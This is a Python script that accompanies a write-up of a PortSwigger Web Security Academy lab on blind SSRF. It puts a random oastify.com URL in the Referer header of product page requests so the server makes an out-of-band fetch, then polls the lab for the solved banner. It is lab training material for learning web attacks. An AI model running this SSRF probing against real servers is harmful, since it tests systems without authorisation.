#!/usr/bin/env python3
"""
Blind SSRF with out-of-band detection
PortSwigger Web Security Academy -- Server-Side Request Forgery (SSRF)

Companion script for the writeup: 05-blind-ssrf-out-of-band-detection.md

What this does:
    Sets a Referer header pointing at a freshly generated random subdomain of
    *.oastify.com on a handful of product page requests. The site's analytics
    software fetches whatever URL sits in Referer server-side, with nothing
    about that fetch reflected back in the HTTP response -- this is blind SSRF.
    *.oastify.com is the one out-of-band domain PortSwigger's lab platform
    itself watches for interactions against, so no separate Burp Collaborator
    client is needed here: we just need the interaction to happen, and the
    platform auto-detects it and flips the lab to solved. Polls the lab's own
    page for the "Congratulations" banner rather than reading a Collaborator
    interaction log.

Usage:
    python 05-blind-ssrf-out-of-band-detection.py <lab-url>

Requirements:
    pip install httpx
"""

import secrets
import sys
import time
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    token = secrets.token_hex(16)
    oast = f"http://{token}.oastify.com"
    print(f"[*] OAST URL: {oast}")

    for pid in (1, 2, 3):
        r = client.get(f"{lab_url}/product?productId={pid}", headers={"Referer": oast})
        print(f"[*] GET /product?productId={pid} with Referer={oast} -> status={r.status_code}")

    print("[*] Waiting for the lab platform to auto-detect the interaction...")
    for i in range(12):
        time.sleep(10)
        check = client.get(lab_url)
        if "congratulations" in check.text.lower():
            print(f"[+] Lab solved -- out-of-band interaction confirmed after ~{(i + 1) * 10}s.")
            return
        print(f"    still waiting ({(i + 1) * 10}s)...")

    print("[-] Not solved after 120s. Try re-running -- OAST callbacks can be delayed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
